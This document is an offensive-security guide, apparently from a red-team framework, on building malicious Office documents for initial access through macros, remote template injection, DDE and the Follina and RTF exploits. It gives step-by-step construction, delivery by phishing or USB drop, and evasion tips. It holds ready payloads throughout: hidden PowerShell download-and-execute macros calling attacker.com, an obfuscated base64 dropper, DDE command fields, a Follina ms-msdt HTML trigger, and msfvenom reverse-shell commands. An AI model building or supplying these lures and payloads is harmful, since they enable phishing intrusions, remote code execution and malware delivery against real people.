# Malicious Office Documents

**Type:** Malicious Documents & File-Based Delivery  
**Platform:** Windows  
**Prerequisites:** user must open the document; may require enabling macros or vulnerable Office versions (e.g., Word 2013/2016/2019/365).


---
## Overview

Malicious Office Documents are commonly used in the Initial Access phase of cyberattacks. They leverage built-in Office features (macros, remote templates, embedded objects) or vulnerabilities (e.g., Follina, Equation Editor) to execute attacker-controlled code when a user opens the document ( or just previews it, in some cases)


---
## How It Works

Attackers craft Office documents that exploit either user interaction or software vulnerabilities:

#### A. VBA Macros or Excel 4.0 Macros (XLM)

**VBA Macros** are Visual Basic for Applications scripts embedded within Office documents. **Excel 4.0 Macros (XLM)** are an older macro format from the 1990s but still supported by Excel.

**How It Works**

- Attackers embed a malicious VBA or XLM macro in `.docm`, `.xls`, or `.xlsm` files.
- The macro can trigger automatically using functions like `AutoOpen()` or `Workbook_Open()`.
- The macro typically executes a command like PowerShell or WScript to download a second-stage payload.

**Key Notes**

- Requires the user to **enable macros** (though social engineering often tricks them into doing so).
- XLM macros often hide in **hidden sheets**, making them harder to detect.
- Can easily bypass email filters if obfuscated.

**Resources:**
- [Excel 4.0 Macros Attack](https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits)
- [Excel 4.0 macro (XLM) dropper payload using MacroPack Pro YOUTUBE](https://youtu.be/ym3n-mMzwqI?si=fCUT_L_NPJ5l9MMR)
- [Making Malicious Microsoft Office Files YOUTUBE](https://youtu.be/JOU-0dwx8Og?si=8_7EHxEkHXjSeGPC)
- [Making malicious ms word documents](https://pswalia2u.medium.com/creating-malicious-word-documents-70f474a4892)

#### B.  Remote Template Injection

Office documents can link to **external templates** (e.g., `.dotm`, `.xltm`) hosted on an attacker-controlled server.

**How It Works**

- Attacker crafts a Word document (`.docx`) that points to a remote template:
```xml
<w:attachedTemplate w:val="http://attacker.com/malicious_template.dotm"/>
```
- When the victim opens the document, Office fetches the remote template.
- If the template contains a macro it will be executed, it **bypasses initial security prompts** in some versions, as the template is fetched silently.

**Key Notes**

- **Macros in remote templates may run without a prompt**, depending on trust settings.
- This technique separates the **initial phish** from the **actual payload**, aiding evasion and modularity.

**Resources:**
- [The Mechanics of Remote Template Injection Attack](https://www.cyfirma.com/research/living-off-the-land-the-mechanics-of-remote-template-injection-attack/)
- [POC YOUTUBE](https://youtu.be/M5ktO-BwPwA?si=PrCblCwggvuKsXVc)

#### C.  DDE Abuse 

**DDE** is a legacy feature in Office for sharing data between applications like Excel and Word.

**How It Works**

- Attackers embed DDE fields in documents:
```
{DDEAUTO cmd.exe "/k calc.exe"}
```
- When the document is opened, Word/Excel tries to update the field.
- The user may see a prompt, but it’s not labeled clearly as "running code"

**Key Notes** 

- Doesn’t require macros or external files.
- Limited by modern Office versions, which now display warnings.
- Very effective in older Office installations and phishing campaigns with weak awareness.

**Resources:**
- [APT GROUPS uses DDE](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/)
- [POC YOUTUBE](https://youtu.be/b-q_n1T_T7U?si=E5dPUsGTdrxgX4pZ)

#### D.  CVE-2022-30190 ( Follina )

**Follina** exploits Microsoft Word’s ability to download remote HTML content and the `ms-msdt:` protocol handler to achieve **remote code execution (RCE)**.

**How It Works**

- A malicious Word file references an external HTML file via a remote template.
- The HTML file triggers the `ms-msdt:` URI scheme, causing MSDT (Microsoft Support Diagnostic Tool) to execute attacker-supplied code.

**Key Notes**

- Worked even in **Protected View** or **Preview Pane**.
- Microsoft patched this in June 2022, but many systems remain unpatched.
- Can be embedded into `.docx`, `.rtf`, or `.html` files.
```html
<script>
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=calc?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression('Start-Process calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>
```

**Resources:**
- [POC john hammond YOUTUBE](https://youtu.be/dGCOhORNKRk?si=tmuWOaOwlfocuS_6)
- [exploiting 0-day-msdt-follina-vulnerability CVE-2022–30190](https://medium.com/@chemiron2020/exploiting-0-day-msdt-follina-vulnerability-4fd7d518435f)

#### E.  RTF exploits  

RTF (Rich Text Format) files can include **object embeddings** and exploit **parsing vulnerabilities** in Office or Windows components.

**How It Works**

- Attacker crafts a malicious `.rtf` file (e.g., with an embedded OLE object or crafted control word).
- When the user opens or sometimes just **previews** the RTF file in Explorer or Word, the vulnerable code is triggered.
- Payload is often an **executable**, **shellcode**, or **MSHTML/Equation Editor** exploit.

**Key Notes**

- Preview-based RCE makes it **extremely dangerous**.
- CVEs like **CVE-2017-11882** (Equation Editor) and **CVE-2023-21716** (heap corruption in RTF parser) exploited this class.
- Very stealthy and can be delivered through email with `.rtf` attachment.    

**Resources:**
- [Malicious RTF document leading to NetwiredRC and Quasar RAT ](https://www.zscaler.com/blogs/security-research/malicious-rtf-document-leading-netwiredrc-and-quasar-rat)
- [CVE-2017-11882 YOUTUBE](https://youtu.be/iqwvECQD_io?si=eAy9WLYzNFbIs38n)



---
## Prerequisite

- Target OS: Windows
- User Interaction:  in a typical scenario user must click on the malicious document or preview it (may require user to enable macros)
- Network Connectivity: Often required (for downloading payloads)  
- Dependencies or Tools:
    - Windows machine with office software installed  (to craft the malicious office document file)


---
## Steps to Implement


#### Macro-Based Attack

1. **Create a office document file (e.g., word document ) or use an existing one.**
![[open-document.png]]

2. **inject a malicious macro into the document. ( VBA script )** 
![[add-macros.png]]

![[AutoOpen-macro.png]]

![[vba-script.png]]

![[save-document.png]]

![[save-docx.png]]

3. **Host the secondary payload ( stage2 )**
```shell
python3 -m http.server 80
```

4. **Deliver document to the target via :**
  - Phishing email
  - USB drop
  - Shared folder / drive

5. **Start listener (e.g., Metasploit multi/handler) to catch reverse shell.**
![[Initial-Pwn-Framework/modules/windows/malicious-office-documents/prepare-for-attack.png]]

6. **Execution:**

When the victim open the malicious document, in older versions of office software the macro will be executed directly but in new versions the user will be prompted to enable macros.
![[Initial-Pwn-Framework/modules/windows/malicious-office-documents/pwnd.png]]


#### Follina (CVE-2022-30190)

1. **Create malicious Word document referencing remote HTML:**

- take any word document and rename it to "somthing.zip" then Unzip it using `winrar.exe`  
> office documents is a compressed file that can be unzipped using (e.g : **`winrar.exe`** )

 on windows: rename the file to "filename.zip" then right click on it and "**Extract to**" .
 you'll get a folder structure like:
```javascript
follina_unzipped/
├── [Content_Types].xml
├── word/
│   ├── document.xml
│   ├── _rels/document.xml.rels
│   └── ...

```

- Edit the relationships file to reference remote HTML:
open :  `follina_unzipped/word/_rels/document.xml.rels`
Add a malicious relationship tag inside `<Relationships>`:
```text
<Relationship Id="rId1337" 
              Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" 
              Target="http://ATTACKER-IP/payload.html" 
              TargetMode="External"/>

```
- Repackage the document :
Zip the files back into a `.docx`

2. **Prepare malicious HTML payload to trigger ms-msdt protocol:**

```html
<html>
<head></head>
<body>

<script>
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...[*4096 bytes, truncated]

window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=calc?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression('Start-Process calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>

</body>
</html>
```

3. **Host the HTML file on a web-server and deliver DOCX to the victim.**

4. **Execution**
When the user open the malicious document file, the document will retrieves the remote html file and renders it , resulting in a reverse shell being established.

#### Remote Template Injection

1. **Create the Malicious `.dotm` Template**
Use Word to create a new **macro-enabled template**:

- File → Save As → `.dotm`
- Press `Alt + F11` to open the VBA editor.
- Paste a payload:
```vb
Sub AutoOpen()
    Shell "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
End Sub
```
Save and host this file on your HTTP server (e.g., `http://attacker.com/template.dotm`).

2. **Create a Decoy Word Document**
Make a regular `.docx` with some content like "Financial Report".
Rename it to "file.zip" then unzip it by right click on it and "**Extract to**" e.g : "decoy".

3. **Inject Remote Template Relationship**
  Edit `decoy/word/_rels/settings.xml.rels` and add:
```xml
<Relationship Id="rId1337"
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="http://attacker.com/template.dotm" // add the url to your payload here 
  TargetMode="External"/>
```
Then edit `decoy/word/settings.xml` and add inside `<w:settings>`:
```xml
<w:attachedTemplate r:id="rId1337"/>
```

4. **Repackage the File**
Re-zip and rename back to `.docx`:

Now you have a "malicious_report.docx" that looks benign, but loads a remote .dotm template that executes a payload.

5. **host the malicious `.docm` template on a server  then deliver the decoy to the victim.**
```shell
python3 -m http.server 80
```

6. **Execution**
when the victim opens the decoy document it will retrieve the remote template and renders it ( executes the enabled macros ), resulting in a reverse shell.

#### RTF Exploit (CVE-2017-11882 as example)

Use available POCs (e.g., msf exploits or public tools). [CVE-2017-11882](https://github.com/Ridter/CVE-2017-11882)

#### DDE Abuse

1. **Open Microsoft Word**
   - Open a blank Word document.

2. **Enable Field Code Editing**

- Place your cursor where you want the payload.
- Press **`Ctrl + F9`** — this inserts special field brackets like this:
```
{ }
```
  Do NOT type the braces manually — use `Ctrl + F9`.

3. **Insert DDE Payload**

Inside the `{ }`, write the following DDE field:
```
{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }
```
Replace `calc.exe` with any system command. Example with PowerShell:
```
{ DDEAUTO c:\\windows\\system32\\powershell.exe "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/payload.ps1')" }
```

4. **Activate the Field**
- Click inside the field.
- Press **`F9`** to update the field — this "activates" the DDE field.

5. **Save the File**

- Save the file as **Word 97-2003 Document (`.doc`)**, not `.docx`.
- `.docx` blocks DDE execution by design.
- Use: `File > Save As > Word 97-2003 Document (*.doc)`

6. **Execution**
when the victim opens the document a **security prompt** will pop up :

> "This document contains links that may refer to other files..."

victim should Click **Yes** to trigger execution.


---
## Payload/Code Snippets

-  **VBA Macro 1**
```vb
Sub AutoOpen()
Dim x As Object
Set x = CreateObject("Wscript.Shell")
x.Run "powershell -nop -w hidden -enc <BASE64_PAYLOAD>"
End Sub
```

- **VBA Macro 2**
```vb
Sub AutoOpen()
    juice = "SQBFAFgAKABOAGUAdwAt" & _
    "AE8AYgBqAGUAYwB0ACAA" & _
    "UwB5AHMAdABlAG0ALgBO" & _
    "AGUAdAAuAFcAZQBiAEMA" & _
    "bABpAGUAbgB0ACkALgBE" & _
    "AG8AdwBuAGwAbwBhAGQA" & _
    "UwB0AHIAaQBuAGcAKAAn" & _
    "AGgAdAB0AHAAOgAvAC8A" & _
    "MQAyADcALgAwAC4AMAAu" & _
    "ADEAOgA4ADAAMAAwAC8A" & _
    "cABhAHkAbABvAGEAZAAu" & _
    "AHAAcwAxACcAKQA="
    wheel = "powershell.exe -E """ & juice & """"
    Set agent = CreateObject("WScript.Shell")
    
    agent.Run wheel, 0, False
    
End Sub
```

- **PowerShell Payload Example**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/payload.ps1')
```

- **msfvenom Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe > payload.exe
```

- **follina exploit html payload** 
```html
<html>
<head></head>
<body>

<script>

//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...[*4096 bytes, truncated]

window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=calc?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression('Start-Process calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>

</body>
</html>
```


---
## Tips

- Combine multiple stages for better evasion (e.g., macro -> download second stage -> execute shellcode).
- Use staging servers to rotate payload URLs.
- Test extensively in a fully isolated virtual lab.  
- Utilize decoy content to lure victims (invoice, HR doc, contract, etc.).
   

---
## References

- [CVE-2022-30190 (Follina)](https://github.com/JMousqueton/PoC-CVE-2022-30190)
- [CVE-2017-11882 (Equation Editor)](https://github.com/Ridter/CVE-2017-11882)
- [CVE-2023-21716 (RTF Heap Corruption)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/gyaansastra/CVE-2023-21716&ved=2ahUKEwjRgOrb8PqNAxW7nP0HHYuSHIQQFnoECCwQAQ&usg=AOvVaw0nkJENQB4gNPVdbDaxSpCn)
- [MITRE ATT&CK T1566.001: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- [MITRE ATT&CK T1203: Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203/)
- [https://attack.mitre.org/techniques/T1193/](https://attack.mitre.org/techniques/T1193/)
- [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)
- [https://github.com/outflanknl/EvilClippy](https://github.com/outflanknl/EvilClippy)
- [https://github.com/decalage2/oletools](https://github.com/decalage2/oletools)


---

***Author*** : **o-sec** 